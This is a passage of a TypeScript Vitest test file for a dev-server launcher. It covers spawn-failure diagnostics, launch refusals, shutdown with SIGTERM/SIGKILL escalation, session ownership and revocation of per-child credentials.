    const child = await spawnedChild(harness, pending);
    const sentinels = sentinelOutput(harness.issuer.tokens[0] ?? '');

    child.print(sentinels.stderr, 'stderr');
    child.print('sh: 1: next: command not found\n', 'stderr');
    child.failToSpawn('ENOENT');
    const error = expectErr(await pending, 'DEV_SERVER_LAUNCH_FAILED', 'spawn-failed');

    expectNoOutputLeak(harness, error, [...sentinels.fragments, 'sh: 1: next']);
    expect(error.details).toStrictEqual({
      reason: 'spawn-failed',
      errorCode: 'ENOENT',
      output: { stdoutLines: 0, stderrLines: 3, diagnostics: ['command-not-found'] },
    });
    expect(error.hint).toContain('"pnpm" was not found on the PATH');
    expect(error.hint).toContain('Its output reported a command that could not be found.');
    expect(loggedOutput(harness, 'The dev-server command could not be started')).toStrictEqual({
      stdoutLines: 0,
      stderrLines: 3,
      truncatedLines: 0,
      diagnostics: ['command-not-found'],
    });
  });

  it('logs a synchronous spawn failure with an empty digest and no argument', async () => {
    const spawnImpl = vi.fn<SpawnLike>(() => {
      throw Object.assign(new Error('spawn pnpm EACCES'), { code: 'EACCES' });
    });
    const harness = createHarness({ deps: { spawnImpl } });

    const error = expectErr(
      await harness.launcher.launch({ projectRoot: harness.projectRoot }),
      'DEV_SERVER_LAUNCH_FAILED',
      'spawn-failed',
    );

    expect(error.details?.['output']).toStrictEqual({
      stdoutLines: 0,
      stderrLines: 0,
      diagnostics: [],
    });
    expect(error.hint).not.toContain('Run the dev script in a terminal');
    const record = harness.records.find(
      (entry) => entry.message === 'The dev-server command could not be started',
    );
    expect(record?.fields).toStrictEqual({
      subsystem: 'dev-server',
      projectRoot: harness.projectRoot,
      command: 'pnpm',
      errorCode: 'EACCES',
      output: { stdoutLines: 0, stderrLines: 0, truncatedLines: 0, diagnostics: [] },
    });
    expect(serializedRecords(harness.records)).not.toContain(DEFAULT_SCRIPT.name);
  });

  it('never logs the output of a child that becomes ready, only its counts', async () => {
    const harness = createHarness();
    const pending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, pending);
    const sentinels = sentinelOutput(harness.issuer.tokens[0] ?? '');

    child.print(sentinels.stdout);
    child.print(`   - Local:        ${DEV_ORIGIN}\n`);
    expectOk(await pending);
    child.print(sentinels.stderr, 'stderr');

    const logged = serializedRecords(harness.records);
    for (const fragment of sentinels.fragments) {
      expect(logged).not.toContain(fragment);
    }
    expect(harness.records.some((record) => Object.hasOwn(record.fields, 'line'))).toBe(false);
    expect(loggedOutput(harness, 'The launched dev server is ready')).toStrictEqual({
      stdoutLines: 4,
      stderrLines: 0,
      truncatedLines: 0,
      diagnostics: [],
    });
  });
});

describe('diagnoseOutputLine', () => {
  const cases: readonly {
    readonly line: string;
    readonly expected: readonly DevServerOutputDiagnostic[];
  }[] = [
    { line: 'Error: listen EADDRINUSE: address already in use :::4173', expected: ['port-in-use'] },
    { line: 'listen tcp 127.0.0.1:4173: bind: address already in use', expected: ['port-in-use'] },
    { line: ' ⚠ Port 4173 is in use, trying 4174 instead.', expected: ['port-in-use'] },
    { line: 'port 4173 is already in use', expected: ['port-in-use'] },
    { line: "Error: Cannot find module 'left-pad'", expected: ['module-not-found'] },
    { line: "  code: 'MODULE_NOT_FOUND',", expected: ['module-not-found'] },
    { line: 'Error [ERR_MODULE_NOT_FOUND]: Cannot find package', expected: ['module-not-found'] },
    { line: "Module not found: Can't resolve './widgets'", expected: ['module-not-found'] },
    { line: 'sh: 1: next: command not found', expected: ['command-not-found'] },
    {
      line: "'next' is not recognized as an internal or external command,",
      expected: ['command-not-found'],
    },
    { line: 'Error: EACCES: permission denied, open', expected: ['permission-denied'] },
    { line: 'Error: EPERM: operation not permitted, rename', expected: ['permission-denied'] },
    { line: 'Failed to compile.', expected: ['build-error'] },
    { line: 'SyntaxError: Unexpected token', expected: ['build-error'] },
    { line: 'Type error: Property does not exist on type', expected: ['build-error'] },
    {
      line: 'FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory',
      expected: ['out-of-memory'],
    },
    { line: 'Error: spawn ENOMEM', expected: ['out-of-memory'] },
    { line: '\u001b[31mError: listen EADDRINUSE\u001b[0m', expected: ['port-in-use'] },
    {
      line: 'SyntaxError while loading: EACCES on the cache directory',
      expected: ['permission-denied', 'build-error'],
    },
    { line: '  ▲ Next.js ready in 812ms', expected: [] },
    { line: 'compiled /overview in 1.2s (402 modules)', expected: [] },
    { line: '', expected: [] },
  ];

  it.each(cases)('classifies $line as $expected', ({ line, expected }) => {
    const diagnostics = diagnoseOutputLine(line);

    expect(diagnostics).toEqual(expected);
    expect(Object.isFrozen(diagnostics)).toBe(true);
  });

  it('draws every id from the closed vocabulary, in its order', () => {
    expect(DEV_SERVER_OUTPUT_DIAGNOSTICS).toEqual([
      'port-in-use',
      'module-not-found',
      'command-not-found',
      'permission-denied',
      'build-error',
      'out-of-memory',
    ]);
    expect(Object.isFrozen(DEV_SERVER_OUTPUT_DIAGNOSTICS)).toBe(true);
  });

  it('inspects only the bounded prefix of a very long line', () => {
    expect(diagnoseOutputLine(`${'x '.repeat(1_500)}EADDRINUSE`)).toEqual([]);
    expect(diagnoseOutputLine(`EADDRINUSE ${'x '.repeat(1_500)}`)).toEqual(['port-in-use']);
  });
});

describe('DevServerLauncher.launch: refusals before anything starts', () => {
  it.each([
    {
      label: 'a relative project root',
      root: () => 'atlas-console',
      reason: 'project-root-not-absolute',
    },
    {
      label: 'a project root that is not a directory',
      root: () => join(makeSandbox('gone'), 'missing'),
      reason: 'project-root-not-a-directory',
    },
  ])('refuses $label as PROJECT_NOT_FOUND', async ({ root, reason }) => {
    const harness = createHarness();

    const result = await harness.launcher.launch({ projectRoot: root() });

    expectErr(result, 'PROJECT_NOT_FOUND', reason);
    expect(harness.detect).not.toHaveBeenCalled();
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
  });

  it('refuses to launch without the preload, before detecting, minting or spawning', async () => {
    const serviceDir = makeSandbox('bare-service');
    const harness = createHarness({
      deps: {
        preloadPath: join(serviceDir, 'missing', 'register.mjs'),
        fileExists: () => false,
        preloadResolution: {
          moduleUrl: pathToFileURL(join(serviceDir, 'dist', 'service', 'main.js')).href,
          resolvePackage: () => undefined,
        },
      },
    });

    const result = await harness.launcher.launch({ projectRoot: harness.projectRoot });

    const error = expectErr(result, 'INSTRUMENTATION_UNAVAILABLE', 'preload-not-found');
    expect(error.hint).toContain(PRELOAD_BUILD_COMMAND);
    expect(harness.detect).not.toHaveBeenCalled();
    expect(harness.issuer.issue).not.toHaveBeenCalled();
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
    expect(readdirSync(serviceDir)).toEqual([]);
  });

  it('launches nothing when the credential cannot be issued', async () => {
    const harness = createHarness({
      issuer: createIssuer(() =>
        err(new DebuggenError('STORE_ERROR', 'The credentials table is unavailable.')),
      ),
    });

    const result = await harness.launcher.launch({ projectRoot: harness.projectRoot });

    const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'credential-unavailable');
    expect(error.details?.['causeCode']).toBe('STORE_ERROR');
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
  });

  it('reuses a dev server already running with the preload, spawning nothing', async () => {
    const harness = createHarness({
      detection: { running: true, preloadAttached: true, devServerUrl: DEV_URL },
    });

    const launch = expectOk(
      await harness.launcher.launch({ projectRoot: harness.projectRoot, devServerUrl: DEV_URL }),
    );

    expect(launch).toMatchObject({ managed: false, alreadyRunning: true, devServerUrl: DEV_URL });
    // The service owns no process for it, so the protocol response (which names a pid) has none.
    expect(toDevServerLaunchResponse(launch)).toBeUndefined();
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
    expect(harness.issuer.issue).not.toHaveBeenCalled();
    expect(harness.launcher.list()).toEqual([]);
  });

  it('refuses a second server beside one running without the preload, with the exact relaunch hint', async () => {
    const facts: DetectionFacts = { running: true, preloadAttached: false, devServerUrl: DEV_URL };
    const harness = createHarness({ detection: facts });

    const result = await harness.launcher.launch({
      projectRoot: harness.projectRoot,
      devServerUrl: DEV_URL,
    });

    const error = expectErr(result, 'SERVER_AGENT_NOT_READY', 'running-without-preload');
    expect(error.hint).toBe(
      buildRelaunchHint(detectionFor(harness.projectRoot, harness.preloadPath, facts)),
    );
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
    expect(harness.issuer.issue).not.toHaveBeenCalled();
  });

  it('forwards its preload and ingest endpoint to real detection, so the relaunch hint names them', async () => {
    // An un-preloaded Next.js dev server answering at the URL: it carries the
    // framework's own response header, as `next dev` does, so detection that
    // checks server identity recognises it rather than an unrelated process.
    const fetchImpl = vi.fn<FetchLike>(() =>
      Promise.resolve({
        status: 200,
        headers: { get: (name: string) => (name === 'x-powered-by' ? 'Next.js' : null) },
      }),
    );
    const serverAgents: ServerAgentPresence = { hasServerAgentForProject: () => false };
    const harness = createHarness({
      detect: detectDevServer,
      deps: { detectDeps: { fetchImpl, serverAgents } },
    });

    const result = await harness.launcher.launch({
      projectRoot: harness.projectRoot,
      devServerUrl: DEV_URL,
    });

    const error = expectErr(result, 'SERVER_AGENT_NOT_READY', 'running-without-preload');
    const expected = await detectDevServer(
      { projectRoot: harness.projectRoot, devServerUrl: DEV_URL },
      {
        config: SERVICE_CONFIG,
        preloadPath: harness.preloadPath,
        ingestUrl: resolveIngestUrl(SERVICE_CONFIG),
        fetchImpl,
        serverAgents,
      },
    );
    expect(error.hint).toBe(expected.relaunchHint);
    expect(expected.relaunchCommand).toContain(pathToFileURL(harness.preloadPath).href);
    expect(expected.relaunchCommand).toContain(resolveIngestUrl(SERVICE_CONFIG));
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
  });

  it.each([
    { label: 'the detected dev script', command: undefined },
    { label: 'an explicit command', command: 'next dev --port 4173' },
  ])(
    'refuses to launch over an address another process holds ($label), minting and spawning nothing',
    async ({ command }) => {
      // Something answers at the session URL with no Next.js signature:
      // detection reports the address occupied.
      const fetchImpl = vi.fn<FetchLike>(() => Promise.resolve({ status: 404 }));
      const serverAgents: ServerAgentPresence = { hasServerAgentForProject: () => false };
      const harness = createHarness({
        detect: detectDevServer,
        deps: { detectDeps: { fetchImpl, serverAgents } },
      });

      const result = await harness.launcher.launch({
        projectRoot: harness.projectRoot,
        devServerUrl: DEV_URL,
        ...(command === undefined ? {} : { command }),
      });

      const error = expectErr(result, 'DEV_SERVER_UNAVAILABLE', 'address-occupied');
      const expected = await detectDevServer(
        { projectRoot: harness.projectRoot, devServerUrl: DEV_URL },
        {
          config: SERVICE_CONFIG,
          preloadPath: harness.preloadPath,
          ingestUrl: resolveIngestUrl(SERVICE_CONFIG),
          fetchImpl,
          serverAgents,
        },
      );
      expect(expected.occupied).toBe(true);
      expect(expected.canLaunch).toBe(false);
      expect(error.message).toBe(
        "Another process answers at this project's dev-server address and was not identified as this project's dev server, so no dev server was started there.",
      );
      expect(error.hint).toBe(expected.relaunchHint);
      expect(error.details).toStrictEqual({
        reason: 'address-occupied',
        devServerUrl: DEV_URL,
        status: 404,
      });
      expect(harness.issuer.issue).not.toHaveBeenCalled();
      expect(harness.spawner.spawn).not.toHaveBeenCalled();
      expect(harness.probe).not.toHaveBeenCalled();
      expect(harness.launcher.list()).toEqual([]);
      const record = harness.records.find(
        (entry) =>
          entry.message ===
          'Another process answers at the dev-server address; nothing was launched',
      );
      expect(record?.fields).toStrictEqual({
        subsystem: 'dev-server',
        projectRoot: harness.projectRoot,
        devServerUrl: DEV_URL,
        status: 404,
      });
    },
  );

  it.each([404, 500])(
    'refuses an unsigned HTTP %i at the session URL although a server-agent is connected for the project (its server may listen elsewhere)',
    async (status) => {
      // The project's server-agent is connected — from a dev server on another
      // port — while an unrelated process answers at the session URL. The
      // agent vouches for no address, so the launcher neither reuses that
      // process as this project's server nor launches over it.
      const fetchImpl = vi.fn<FetchLike>(() => Promise.resolve({ status }));
      const hasServerAgentForProject = vi.fn<(projectRoot: string) => boolean>(() => true);
      const serverAgents: ServerAgentPresence = { hasServerAgentForProject };
      const harness = createHarness({
        detect: detectDevServer,
        deps: { detectDeps: { fetchImpl, serverAgents } },
      });

      const result = await harness.launcher.launch({
        projectRoot: harness.projectRoot,
        devServerUrl: DEV_URL,
      });

      const error = expectErr(result, 'DEV_SERVER_UNAVAILABLE', 'address-occupied');
      expect(error.details).toStrictEqual({
        reason: 'address-occupied',
        devServerUrl: DEV_URL,
        status,
      });
      const expected = await detectDevServer(
        { projectRoot: harness.projectRoot, devServerUrl: DEV_URL },
        {
          config: SERVICE_CONFIG,
          preloadPath: harness.preloadPath,
          ingestUrl: resolveIngestUrl(SERVICE_CONFIG),
          fetchImpl,
          serverAgents,
        },
      );
      expect(expected).toMatchObject({
        running: false,
        occupied: true,
        preloadAttached: false,
        canLaunch: false,
      });
      expect(error.hint).toBe(expected.relaunchHint);
      expect(hasServerAgentForProject).toHaveBeenCalledWith(harness.projectRoot);
      expect(harness.issuer.issue).not.toHaveBeenCalled();
      expect(harness.spawner.spawn).not.toHaveBeenCalled();
      expect(harness.probe).not.toHaveBeenCalled();
      expect(harness.ownership).not.toHaveBeenCalled();
      expect(harness.launcher.list()).toEqual([]);
    },
  );
});

describe('DevServerLauncher.launch: one child per project', () => {
  it('returns the existing child for a second launch of the same project, spawning once', async () => {
    const harness = createHarness();
    const { launch: first } = await launchReady(harness, { sessionId: 'ses-alpha' });

    const second = expectOk(
      await harness.launcher.launch({ projectRoot: harness.projectRoot, sessionId: 'ses-beta' }),
    );

    expect(second).toStrictEqual({
      managed: true,
      alreadyRunning: true,
      devServerUrl: DEV_URL,
      pid: first.pid,
    });
    expect(harness.spawner.spawn).toHaveBeenCalledTimes(1);
    expect(harness.issuer.issue).toHaveBeenCalledTimes(1);
    expect(harness.detect).toHaveBeenCalledTimes(1);
    expect(harness.launcher.list()).toMatchObject([{ sessionIds: ['ses-alpha', 'ses-beta'] }]);
  });

  it('joins a concurrent launch of the same project instead of spawning a second child', async () => {
    const harness = createHarness();
    const firstPending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const secondPending = harness.launcher.launch({ projectRoot: harness.projectRoot });
    const child = await spawnedChild(harness, firstPending);

    child.print(`ready at ${DEV_ORIGIN}\n`);
    const [first, second] = await Promise.all([firstPending, secondPending]);

    expect(expectOk(first)).toMatchObject({ managed: true, alreadyRunning: false, pid: FIRST_PID });
    expect(expectOk(second)).toMatchObject({ managed: true, alreadyRunning: true, pid: FIRST_PID });
    expect(harness.spawner.spawn).toHaveBeenCalledTimes(1);
    expect(harness.issuer.issue).toHaveBeenCalledTimes(1);
  });
});

// ---------------------------------------------------------------------------
// stop, session coupling and shutdown
// ---------------------------------------------------------------------------

describe('DevServerLauncher.stop', () => {
  it('sends SIGTERM, escalates to SIGKILL after stopGraceMs, and revokes exactly once', async () => {
    vi.useFakeTimers();
    const harness = createHarness({
      children: [{ exitsOn: ['SIGKILL'] }],
      deps: { stopGraceMs: 1_000 },
    });
    const { child } = await launchReady(harness);
    const token = harness.issuer.tokens[0] ?? '';

    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    let settled = false;
    void stopping.then(() => {
      settled = true;
    });
    await vi.advanceTimersByTimeAsync(999);

    expect(child.signals).toEqual(['SIGTERM']);
    expect(settled).toBe(false);

    await vi.advanceTimersByTimeAsync(1);
    expect(expectOk(await stopping)).toStrictEqual({ stopped: true });

    expect(child.signals).toEqual(['SIGTERM', 'SIGKILL']);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.issuer.revoke.mock.calls[0]?.[0]).toStrictEqual({
      projectRoot: harness.projectRoot,
      token,
      credentialId: 'cred-1',
    });
    expect(harness.launcher.list()).toEqual([]);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('needs no escalation for a child that honours SIGTERM', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness);

    expect(
      expectOk(await harness.launcher.stop({ projectRoot: harness.projectRoot })),
    ).toStrictEqual({
      stopped: true,
    });

    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.launcher.list()).toEqual([]);
  });

  it('stops a launched child selected by its pid', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness);

    expect(expectOk(await harness.launcher.stop({ pid: FIRST_PID }))).toStrictEqual({
      stopped: true,
    });

    expect(child.signals).toEqual(['SIGTERM']);
  });

  it('answers stopped:false, a success, when nothing matches', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness);

    expect(
      expectOk(await harness.launcher.stop({ projectRoot: makeProject('other') })),
    ).toStrictEqual({
      stopped: false,
    });
    expect(expectOk(await harness.launcher.stop({ pid: FIRST_PID + 50 }))).toStrictEqual({
      stopped: false,
    });

    expect(child.signals).toEqual([]);
    expect(harness.launcher.list()).toHaveLength(1);
  });

  it('refuses a stop request that names nothing, or a relative project root', async () => {
    const harness = createHarness();

    expectErr(await harness.launcher.stop({}), 'PROJECT_NOT_FOUND', 'no-selector');
    expectErr(
      await harness.launcher.stop({ projectRoot: 'atlas-console' }),
      'PROJECT_NOT_FOUND',
      'project-root-not-absolute',
    );
  });

  it('marks a child that exits on its own as exited, and revokes exactly once across exit, stop and stopAll', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness);

    child.finish(0, null);

    expect(harness.launcher.list()).toMatchObject([{ pid: FIRST_PID, status: 'exited' }]);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);

    expect(
      expectOk(await harness.launcher.stop({ projectRoot: harness.projectRoot })),
    ).toStrictEqual({
      stopped: false,
    });
    await harness.launcher.stopAll();

    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(child.signals).toEqual([]);
    expect(harness.launcher.list()).toEqual([]);
  });

  it('spawns a fresh child for a project whose previous child exited', async () => {
    const harness = createHarness();
    const { child: first } = await launchReady(harness);
    first.finish(1, null);

    const { launch } = await launchReady(harness, {}, 1, 'http://127.0.0.1:4174');

    expect(launch).toMatchObject({
      alreadyRunning: false,
      pid: FIRST_PID + 1,
      devServerUrl: 'http://127.0.0.1:4174/',
    });
    expect(harness.spawner.spawn).toHaveBeenCalledTimes(2);
    expect(harness.issuer.issue).toHaveBeenCalledTimes(2);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.launcher.list()).toMatchObject([{ pid: FIRST_PID + 1, status: 'ready' }]);
  });
});

describe('DevServerLauncher.stopForSession', () => {
  it("terminates only the ended session's children", async () => {
    const harness = createHarness();
    const secondRoot = makeProject('second');
    await launchReady(harness, { sessionId: 'ses-alpha' });
    await launchReady(
      harness,
      { projectRoot: secondRoot, sessionId: 'ses-beta' },
      1,
      'http://127.0.0.1:4174',
    );
    const [alphaChild, betaChild] = harness.spawner.children;

    await harness.launcher.stopForSession('ses-alpha');

    expect(alphaChild?.signals).toEqual(['SIGTERM']);
    expect(betaChild?.signals).toEqual([]);
    expect(harness.launcher.list().map((record) => record.projectRoot)).toEqual([secondRoot]);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    expect(harness.issuer.revoke.mock.calls[0]?.[0]).toMatchObject({
      projectRoot: harness.projectRoot,
    });

    await harness.launcher.stopForSession('ses-beta');

    expect(betaChild?.signals).toEqual(['SIGTERM']);
    expect(harness.launcher.list()).toEqual([]);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(2);
  });

  it('keeps a shared child until the last session relying on it ends', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness, { sessionId: 'ses-alpha' });
    expectOk(
      await harness.launcher.launch({ projectRoot: harness.projectRoot, sessionId: 'ses-beta' }),
    );

    await harness.launcher.stopForSession('ses-alpha');

    expect(child.signals).toEqual([]);
    expect(harness.launcher.list()).toMatchObject([{ sessionIds: ['ses-beta'] }]);

    await harness.launcher.stopForSession('ses-beta');

    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.launcher.list()).toEqual([]);
  });

  it('ignores an empty or unknown session id', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness, { sessionId: 'ses-alpha' });

    await harness.launcher.stopForSession('');
    await harness.launcher.stopForSession('ses-unknown');

    expect(child.signals).toEqual([]);
    expect(harness.launcher.list()).toHaveLength(1);
  });

  it('reports how many children it stopped', async () => {
    const harness = createHarness();
    await launchReady(harness, { sessionId: 'ses-alpha' });

    expect(expectOk(await harness.launcher.stopForSession('ses-alpha'))).toStrictEqual({
      stopped: 1,
    });
    expect(expectOk(await harness.launcher.stopForSession('ses-alpha'))).toStrictEqual({
      stopped: 0,
    });
  });

  it('never stops a developer-owned child, not even one a session reused', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness);

    const reused = expectOk(
      await harness.launcher.launch({ projectRoot: harness.projectRoot, sessionId: 'ses-alpha' }),
    );
    expect(reused).toMatchObject({ managed: true, alreadyRunning: true, pid: FIRST_PID });
    expect(harness.launcher.list()).toMatchObject([{ sessionIds: [] }]);
    expect(harness.launcher.list()[0]?.sessionId).toBeUndefined();

    // AAP §0.5.1: the developer's dev server keeps serving after the session ends.
    expect(expectOk(await harness.launcher.stopForSession('ses-alpha'))).toStrictEqual({
      stopped: 0,
    });
    expect(child.signals).toEqual([]);
    expect(harness.launcher.list()).toMatchObject([{ pid: FIRST_PID, status: 'ready' }]);
    expect(harness.issuer.revoke).not.toHaveBeenCalled();
  });

  it('refuses a launch for a session that has already ended, minting and spawning nothing', async () => {
    const harness = createHarness();
    await harness.launcher.stopForSession('ses-gone');

    expectErr(
      await harness.launcher.launch({ projectRoot: harness.projectRoot, sessionId: 'ses-gone' }),
      'DEV_SERVER_LAUNCH_FAILED',
      'cancelled',
    );
    expect(harness.issuer.issue).not.toHaveBeenCalled();
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
  });

  it('reports the release incomplete while a stopped child’s credential is still being revoked', async () => {
    vi.useFakeTimers({ now: FIXED_NOW });
    const issuer = createIssuer();
    issuer.revoke.mockReturnValueOnce(storeRefusal());
    const harness = createHarness({ issuer, deps: { now: () => Date.now() } });
    const { child } = await launchReady(harness, { sessionId: 'ses-alpha' });

    const releasing = harness.launcher.stopForSession('ses-alpha');
    await vi.advanceTimersByTimeAsync(0);
    const error = expectErr(await releasing, 'CLEANUP_PARTIAL', 'credential-revocation-pending');

    expect(error.details).toMatchObject({ pending: 1 });
    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.launcher.list()).toEqual([]);

    await vi.advanceTimersByTimeAsync(REVOCATION_RETRY_INITIAL_MS);
    expect(issuer.revoke).toHaveBeenCalledTimes(2);
    expect(vi.getTimerCount()).toBe(0);
  });
});

describe('DevServerLauncher.acquireForSession', () => {
  it('holds a serving session-owned child for a session being created, then counts the session among its owners', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness, { sessionId: 'ses-alpha' });

    const hold = harness.launcher.acquireForSession(harness.projectRoot);
    expect(hold).toMatchObject({ devServerUrl: DEV_URL, sessionOwned: true });

    // The last owner ends while the new session is being created: the hold
    // keeps the child serving.
    expect(expectOk(await harness.launcher.stopForSession('ses-alpha'))).toStrictEqual({
      stopped: 0,
    });
    expect(child.signals).toEqual([]);

    expect(hold?.commit('ses-beta')).toBe(true);
    expect(harness.launcher.list()).toMatchObject([{ sessionIds: ['ses-beta'] }]);
    // A hold takes effect once.
    expect(hold?.commit('ses-gamma')).toBe(false);

    expect(expectOk(await harness.launcher.stopForSession('ses-beta'))).toStrictEqual({
      stopped: 1,
    });
    expect(child.signals).toEqual(['SIGTERM']);
  });

  it('stops a held session-owned child nothing else relies on when its session is not created', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness, { sessionId: 'ses-alpha' });
    const hold = harness.launcher.acquireForSession(harness.projectRoot);
    await harness.launcher.stopForSession('ses-alpha');
    expect(child.signals).toEqual([]);

    await hold?.release();

    expect(child.signals).toEqual(['SIGTERM']);
    expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
    // Released holds cannot be committed afterwards.
    expect(hold?.commit('ses-beta')).toBe(false);
  });

  it('keeps a held child for its other owners when the session is not created', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness, { sessionId: 'ses-alpha' });
    const hold = harness.launcher.acquireForSession(harness.projectRoot);

    await hold?.release();

    expect(child.signals).toEqual([]);
    expect(harness.launcher.list()).toMatchObject([{ sessionIds: ['ses-alpha'] }]);
  });

  it('refuses to join a session that ended before its hold was handed over, stopping the child it would have owned', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness, { sessionId: 'ses-alpha' });
    const hold = harness.launcher.acquireForSession(harness.projectRoot);
    await harness.launcher.stopForSession('ses-alpha');
    await harness.launcher.stopForSession('ses-beta');

    expect(hold?.commit('ses-beta')).toBe(false);
    await vi.waitFor(() => {
      expect(child.signals).toEqual(['SIGTERM']);
    });
  });

  it('reports a lost join when the held child exited while its session was being created', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness, { sessionId: 'ses-alpha' });
    const hold = harness.launcher.acquireForSession(harness.projectRoot);

    child.finish(1, null);

    expect(hold?.commit('ses-beta')).toBe(false);
    expect(harness.launcher.acquireForSession(harness.projectRoot)).toBeUndefined();
  });

  it('gives a trivial hold on a developer-owned child, which no session end stops', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness);

    const hold = harness.launcher.acquireForSession(harness.projectRoot);
    expect(hold).toMatchObject({ devServerUrl: DEV_URL, sessionOwned: false });
    // Joining is `false` by design: the child needs no owner.
    expect(hold?.commit('ses-alpha')).toBe(false);
    await harness.launcher.stopForSession('ses-alpha');

    expect(child.signals).toEqual([]);
    expect(harness.launcher.list()).toMatchObject([{ sessionIds: [] }]);
  });

  it('holds nothing for an unknown project, a relative root or a child that is not serving', async () => {
    const harness = createHarness();
    const { child } = await launchReady(harness, { sessionId: 'ses-alpha' });

    expect(harness.launcher.acquireForSession(makeProject('other'))).toBeUndefined();
    expect(harness.launcher.acquireForSession('relative/root')).toBeUndefined();

    child.finish(0, null);
    expect(harness.launcher.acquireForSession(harness.projectRoot)).toBeUndefined();
  });
});

describe('DevServerLauncher: session ownership races', () => {
  it('never ties a child to a session that ended while its launch waited on another', async () => {
    const harness = createHarness();
    const first = harness.launcher.launch({
      projectRoot: harness.projectRoot,
      sessionId: 'ses-alpha',
    });
    const child = await spawnedChild(harness, first);

    // ses-beta joins the launch in flight, then ends before the child is ready.
    const second = harness.launcher.launch({
      projectRoot: harness.projectRoot,
      sessionId: 'ses-beta',
    });
    expect(expectOk(await harness.launcher.stopForSession('ses-beta'))).toStrictEqual({
      stopped: 0,
    });
    // A serving-address label ("serving at") makes the address a candidate;
    // readiness then verifies it as the child's own listener.
    child.print(`  ready - serving at ${DEV_ORIGIN}\n`);

    expectOk(await first);
    expectErr(await second, 'DEV_SERVER_LAUNCH_FAILED', 'cancelled');
    expect(harness.launcher.list()).toMatchObject([{ sessionIds: ['ses-alpha'] }]);

    // ses-alpha's end is the last owner's: nothing keeps the child alive.
    expect(expectOk(await harness.launcher.stopForSession('ses-alpha'))).toStrictEqual({
      stopped: 1,
    });
    expect(child.signals).toEqual(['SIGTERM']);
  });

  it('keeps reporting an ended session’s release incomplete until its credential is revoked', async () => {
    vi.useFakeTimers({ now: FIXED_NOW });
    const issuer = createIssuer();
    issuer.revoke.mockReturnValueOnce(storeRefusal()).mockReturnValueOnce(storeRefusal());
    const harness = createHarness({ issuer, deps: { now: () => Date.now() } });
    await launchReady(harness, { sessionId: 'ses-alpha' });

    const firstEnd = harness.launcher.stopForSession('ses-alpha');
    await vi.advanceTimersByTimeAsync(0);
    expectErr(await firstEnd, 'CLEANUP_PARTIAL', 'credential-revocation-pending');

    let released = false;
    void harness.launcher.whenReleased('ses-alpha').then(() => {
      released = true;
    });

    // A repeated end retries at once and still reports the credential pending.
    const repeated = harness.launcher.stopForSession('ses-alpha');
    await vi.advanceTimersByTimeAsync(0);
    expectErr(await repeated, 'CLEANUP_PARTIAL', 'credential-revocation-pending');
    expect(issuer.revoke).toHaveBeenCalledTimes(2);
    expect(released).toBe(false);

    // The next retry revokes it: the release completes and a later end is clean.
    await vi.advanceTimersByTimeAsync(REVOCATION_RETRY_INITIAL_MS * 4);
    expect(issuer.revoke).toHaveBeenCalledTimes(3);
    await vi.waitFor(() => {
      expect(released).toBe(true);
    });
    expect(expectOk(await harness.launcher.stopForSession('ses-alpha'))).toStrictEqual({
      stopped: 0,
    });
  });
});

describe('DevServerLauncher: preload attribution by address', () => {
  /** A connection view that reports the listed credential digests online. */
  function connections(online: Set<string>): {
    readonly isCredentialConnected: (tokenHash: string) => boolean;
  } {
    return { isCredentialConnected: (tokenHash) => online.has(tokenHash) };
  }

  it('attributes the preload only to its own serving child at that origin, once that child’s agent is online', async () => {
    const online = new Set<string>();
    const harness = createHarness({ deps: { serverAgentConnections: connections(online) } });
    await launchReady(harness, { sessionId: 'ses-alpha' });
    const tokenHash = sha256Hex(harness.issuer.tokens[0] ?? '');

    expect(harness.launcher.preloadServesAt(harness.projectRoot, DEV_ORIGIN)).toBe(false);
    online.add(tokenHash);
    expect(harness.launcher.preloadServesAt(harness.projectRoot, DEV_URL)).toBe(true);
    expect(harness.launcher.preloadServesAt(harness.projectRoot, `${DEV_ORIGIN}/checkout`)).toBe(
      true,
    );
    // Another port of the same project, another project, a malformed URL.
    expect(harness.launcher.preloadServesAt(harness.projectRoot, 'http://127.0.0.1:4999/')).toBe(
      false,
    );
    expect(harness.launcher.preloadServesAt(makeProject('other'), DEV_URL)).toBe(false);
    expect(harness.launcher.preloadServesAt(harness.projectRoot, 'not a url')).toBe(false);

    expect(harness.launcher.addressOfCredential(tokenHash)).toBe(DEV_URL);
    expect(harness.launcher.addressOfCredential(sha256Hex('some-other-token'))).toBeUndefined();

    await harness.launcher.stopForSession('ses-alpha');
